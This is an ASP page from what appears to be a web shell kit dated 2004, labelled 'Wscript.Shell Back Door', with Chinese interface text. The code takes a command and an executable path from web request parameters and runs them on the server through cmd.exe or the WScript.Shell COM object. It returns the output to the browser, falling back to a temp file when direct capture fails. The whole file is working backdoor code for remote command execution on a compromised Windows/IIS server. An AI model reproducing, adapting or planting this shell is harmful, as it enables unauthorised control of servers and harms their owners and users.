<%
	option explicit
%>
<!--#include file="config.asp"-->
<object runat="server" id="ws" scope="page" classid="clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></object>
<object runat="server" id="ws" scope="page" classid="clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></object>
<!-- PageServer Below -->
<%
	pageCmdShell()

	sub pageCmdShell()
		isIn(2)
		dim cmdStr,cmdPath,cmdResult
		cmdStr=request("cmdStr")
		cmdPath=request("cmdPath")
		
		showTitle("Shell操作")
		
		if cmdPath="" then
			cmdPath="cmd.exe"
		end if
		
		if cmdStr<>"" then
			if instr(lcase(cmdPath),lcase("cmd.exe"))>0 or instr(lcase(cmdPath),lcase(myCmdDotExeFile))>0 then
				cmdResult=doCmdRun(cmdPath&" /c "&cmdStr)
			 else
		 		if cmdPath="wscriptShell" then
					cmdResult=doCmdRun(cmdStr)
				 else
					cmdResult=doCmdRun(cmdPath&" "&cmdStr)
				end if
			end if
		end if
		
		echo "<body onload=""document.forms[0].cmdStr.focus();"">"
%> 
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <form action="?pageName=cmdShell" method="post" onSubmit="this.Submit.disabled=true">
  <tr> 
    <td height="22" class="td">&nbsp;<%=request.serverVariables("server_name")%> 
      - Wscript.Shell Back Door</td>
  </tr>
  <tr> 
    <td class="trHead">&nbsp;</td>
  </tr>
  <tr>
      <td height="22" align="center" class="td"> 路径: 
        <input name="cmdPath" type="text" id="cmdPath" value="<%=cmdPath%>" size="50">
        <input type="button" name="Submit2" value="使用wscript.shell" onClick="this.form.cmdPath.value='wscriptShell';"> </td>
  </tr>
  <tr> 
      <td height="22" align="center" class="td">命令/参数: 
        <input name="cmdStr" type="text" id="cmdStr" value="<%=server.htmlEncode(cmdStr)%>" size="60">
      <input type="submit" name="Submit" value="运 行">
        <input type="button" name="Submit3" value="注" onClick="alert('请只在这里执行单步程序\n(程序执行开始到结束不需要人工干预)\n不然本程序会无法正常工作,\n并且在服务器生成一个不可结束的进程.');"> </td>
  </tr>
  <tr> 
    <td height="22" align="center" class="td">
		<textarea name="cmdResult" cols="90" rows="25" id="cmdResult"><%=server.htmlEncode(cmdResult)%></textarea>
    </td>
  </tr>
  <tr> 
    <td class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td height="22" align="right" class="td">Powered By <a href="javascript:;" title="QQ:26696782">Marcos</a> 2004.11&nbsp;</td>
  </tr>
</form>
</table>
<%
		echo "</body>"
		showExecuteTime()
	end sub
	
	function doCmdRun(cmdStr)
		on error resume next
		doCmdRun=ws.exec(cmdStr).stdOut.readAll()
		if err then
			err.clear
			ws.run cmdStr&" > "&server.mapPath(".")&"\001.tmp",0,true
			doCmdRun=fso.openTextFile(server.mapPath(".")&"\001.tmp")
			if err then
				doCmdRun=streamReadFromFile(server.mapPath(".")&"\001.tmp","gb2312")
			end if
		end if
	end function
%>